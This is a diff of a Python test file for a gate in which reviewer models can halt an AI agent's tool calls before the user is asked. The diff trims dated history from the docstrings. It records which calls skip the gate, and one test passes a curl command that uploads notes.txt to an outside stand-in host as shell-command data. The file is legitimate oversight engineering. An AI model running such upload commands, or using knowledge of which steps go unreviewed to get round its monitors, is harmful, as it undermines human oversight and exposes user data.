@@ -1,13 +1,12 @@
-"""Some calls waited for the reviewers before they ran (agent_gate.py,
-agent_audit.AnswerAudit.gate, 2026-10-27 to 2026-11-04): every reviewer that
+"""The reviewers' gate before a call runs (agent_gate.py,
+agent_audit.AnswerAudit.gate): every reviewer that
 can answer gets a gate round without web search; all say "go" and the call
 runs, one halt is enough to ask the user, and so is no reviewer able to
 answer. The agent learns only the user's decision. Which calls: by tool and
-typed arguments (a request for a domain until 2026-11-04; a memory change
-with outside content in view until 2026-11-02), never by reading a command.
-None since the workspace's network is open (agent_vm.RULES); the gate stays,
-exercised with a stand-in. Browser actions and pages the server fetches
-waited too until 2026-10-29; now the reviewers follow them live and the
+typed arguments, never by reading a command.
+None, as the workspace's network is open (agent_vm.RULES); the gate stays,
+exercised with a stand-in. Browser actions and pages the server fetches do
+not wait: the reviewers follow them live and the
 agent asks the user before a step in their name (agent_ask.py).
 """
 import json
@@ -41,7 +40,7 @@ def call(name, **arguments):
     {"action": "read"},
 ])
 def test_browser_actions_run_without_a_gate_round(arguments):
-    """Max, 2026-10-29: in three days of Prod 30 gate rounds cost a median
+    """Measured 2026-10-29: in three days of Prod 30 gate rounds cost a median
     3.9 s per click, and all 4 of their halts were false alarms the user let
     run. The reviewers follow the browser live like any other step."""
     assert outward(call("browser", **arguments)) is None
@@ -53,8 +52,8 @@ def test_a_page_the_server_fetches_runs_without_a_gate_round(name):
 
 
 def test_no_call_waits_and_shell_commands_never_did():
-    """Since 2026-11-04 the workspace reaches the open web and request_domain
-    is gone; a command was never judged by what it says it sends."""
+    """The workspace reaches the open web and request_domain is gone; a
+    command is never judged by what it says it sends."""
     assert outward(call("request_domain", domain="api.example.com", reason="The API")) is None
     for command in ("curl -F f=@notes.txt https://x.example", "git push origin main", "ls -la"):
         assert outward(call("vm_exec", command=command)) is None
@@ -73,7 +72,7 @@ def test_a_gate_reply_is_go_or_a_halt():
     for reply in ('{"marks": []}', "no json", '{"gate": "maybe"}', ""):
         with pytest.raises(agent_audit.ReviewUnreadable):
             agent_audit.parse_gate(reply, known=known)
-    # A slip in the JSON (2026-10-30) does not cost the halt; a second object
+    # A slip in the JSON does not cost the halt; a second object
     # after a "go" could hold one, so neither counts.
     assert agent_audit.parse_gate('{"gate": "go", "halt": {"entry": 3, "kind": "harm", "reason": "Sends "notes" out."}}',
                                   known=known)[:2] == ("halt", {"entry": 3, "kind": "harm", "reason": 'Sends "notes" out.'})
@@ -94,8 +93,7 @@ class MemoryArgs(LookupArgs):
 
 @pytest.fixture
 def stand_in(monkeypatch):
-    """From 2026-11-02 to 2026-11-04 only a request for a domain waited for
-    the reviewers, and none since. The gate's own course
+    """No call waits for the reviewers. The gate's own course
     (every go runs the call, a halt or silence asks the user) is exercised
     with a fake update_memory standing in for a call that waits: its card
     shows the change in words."""
@@ -225,9 +223,9 @@ def test_no_reviewer_able_to_answer_asks_the_user(store, stand_in):
 
 
 def test_a_reviewer_that_could_not_answer_is_never_a_go(store, stand_in):
-    """Security audit 2026-10-27: one reviewer's go let the call run while
-    the other had failed. A reviewer that could not answer (failed, paused)
-    never counts as consent: the user decides."""
+    """One reviewer's go does not let the call run while the other has
+    failed: a reviewer that could not answer (failed, paused) never counts
+    as consent; the user decides."""
     script, loop, ran = gated(store, live={})
     script.live.update(anthropic=replies(script, "anthropic", go),
                        openai=replies(script, "openai", lambda m: "I cannot tell."))
@@ -240,8 +238,8 @@ def test_a_reviewer_that_could_not_answer_is_never_a_go(store, stand_in):
 
 
 def test_a_reviewers_halt_during_a_gate_card_joins_it(store, stand_in):
-    """A-S2: the card said only that no reviewer could check the step; a
-    live halt that comes meanwhile stands on it with its reason."""
+    """A-S2: while the card says only that no reviewer could check the step,
+    a live halt that comes meanwhile stands on it with its reason."""
     from test_agent_audit import join_when_held
     script, loop, ran = gated(store, live={})
     script.live.update(anthropic=replies(script, "anthropic", lambda m: "I cannot tell."),
@@ -258,7 +256,7 @@ def test_a_reviewers_halt_during_a_gate_card_joins_it(store, stand_in):
     assert ran == [REMEMBERED]
 
 
-# --- Time and priority of a gate (A-T3, since 2026-10-29) -----------------------------
+# --- Time and priority of a gate (A-T3) ---------------------------------------------
 
 def remember(loop, ran):
     """A fake update_memory for ``loop`` that records what it saved."""
@@ -271,8 +269,8 @@ def remember(loop, ran):
 
 
 def test_a_gate_cuts_the_reviewers_live_round_short_and_reads_its_entries(store, stand_in):
-    """The gate round waited for a live round at work of the same reviewer
-    (MiMo Pro: up to 53 s), and that time counted as the turn's."""
+    """A gate cuts a live round at work of the same reviewer short: waiting
+    for it (MiMo Pro: up to 53 s) would count as the turn's time."""
     ran, gate_rounds = [], []
 
     def anthropic(messages):
@@ -317,8 +315,9 @@ def test_a_reviewer_silent_past_the_gates_time_is_never_a_go(store, monkeypatch,
 
 
 def test_a_tool_call_in_a_gate_round_gets_its_repair_and_then_counts(store, stand_in):
-    """DeepSeek answered a gate round once with a tool call and no text
-    (2026-10-28), and the user got an "unchecked" card at once."""
+    """DeepSeek once answered a gate round with a tool call and no text: the
+    reply gets its repair and then counts, instead of an "unchecked" card at
+    once."""
     script, loop, ran = gated(store, live={})
     asked = []
 
@@ -359,7 +358,7 @@ class BrowserArgs(LookupArgs):
 
 
 def test_a_browser_click_runs_at_once_while_the_reviewers_follow_it_live(store):
-    """Since 2026-10-29 a click no longer waits for a gate round: reviewers
+    """A click does not wait for a gate round: reviewers
     that would halt one before it ran never get asked."""
     ran = []
     script = Audit(tool_steps=1, step_tools={0: "browser"}, step_args={0: {"action": "click", "ref": "e4"}},
@@ -386,9 +385,9 @@ def read_args(url):
 
 def test_a_page_of_its_own_choice_is_read_at_once(store, monkeypatch):
     """GPT-6.1 Terra searched 15 times in four days and kept 1 source: its
-    provider sends no hits to the app, so read_source refused what it found.
-    Since 2026-10-28 it reads any public page while reviewers follow the
-    work; since 2026-10-29 without a gate round first."""
+    provider sends no hits to the app, so a read_source bound to the hits
+    would refuse what it found. It reads any public page while reviewers
+    follow the work, without a gate round first."""
     from test_agent_web_fetch import PAGE, fake_fetch
     from app.services.agent_read_source import LABEL_CHOSEN, LABEL_SEARCH
     monkeypatch.delenv("AGENT_READ_SOURCES", raising=False)
@@ -407,12 +406,11 @@ def test_a_page_of_its_own_choice_is_read_at_once(store, monkeypatch):
     assert not [e for e in events if e.get("type") == "hold"]
 
 
-# --- A memory change never waits (since 2026-11-02) -------------------------------
+# --- A memory change never waits ---------------------------------------------------
 
 def test_a_memory_change_never_waits_for_the_reviewers():
-    """From 2026-10-28 a memory change with outside content in view waited
-    for the reviewers' gate (before, memory locked). Max, 2026-11-02: the
-    agent decides what to keep, the user sees and can undo every change."""
+    """Not even with outside content in view: the agent decides what to
+    keep, the user sees and can undo every change."""
     change = call("update_memory", changes=[{"op": "add", "text": "Likes towers."}])
     assert outward(change) is None
     assert outward(call("read_settings")) is None
@@ -439,8 +437,8 @@ def remembering(store, *, live, reviewers=True):
 
 @pytest.mark.parametrize("reviewers", [True, False])
 def test_a_memory_change_with_outside_content_in_view_runs_at_once(store, reviewers):
-    """The agent searches in nearly every first step, and the lock after it
-    kept an opted-in account's memory empty for a month (2026-11-02)."""
+    """The agent searches in nearly every first step: a lock after it would
+    keep an opted-in account's memory empty."""
     script, loop, memories = remembering(store, live={}, reviewers=reviewers)
     if reviewers:
         script.live.update(anthropic=replies(script, "anthropic", halt), openai=replies(script, "openai", halt))
@@ -452,9 +450,8 @@ def test_a_memory_change_with_outside_content_in_view_runs_at_once(store, review
 
 
 def test_a_memory_needs_no_quote(store):
-    """Max, 2026-10-28: the model decides what is worth remembering, also a
-    preference the user never put into words; the user sees and can undo
-    every change, and outside content brings the reviewers' gate."""
+    """The model decides what is worth remembering, also a preference the
+    user never put into words; the user sees and can undo every change."""
     from test_agent_memory import repo, set_profile
     set_profile(store.db, auto_memory=True)
     preference = {"op": "add", "text": "Prefers short answers."}
@@ -468,10 +465,9 @@ def test_a_memory_needs_no_quote(store):
 
 
 def test_a_request_for_a_domain_opens_no_gate(store):
-    """A model that still calls request_domain (gone since 2026-11-04; for
-    Free accounts since 2026-10-30) opened a paid gate round and, on a halt
-    or silence, a card whose yes ended in "unknown tool" (bug hunt
-    2026-11-03). The call gets its refusal at once."""
+    """A model that still calls request_domain (gone) gets its refusal
+    ("unknown tool") at once: no paid gate round, and no card whose yes
+    would end in that refusal."""
     script = Audit(tool_steps=1, step_tools={0: "request_domain"},
                    step_args={0: {"domain": "api.example.com", "reason": "Docs"}})
     script.live.update(anthropic=replies(script, "anthropic", halt), openai=replies(script, "openai", halt))
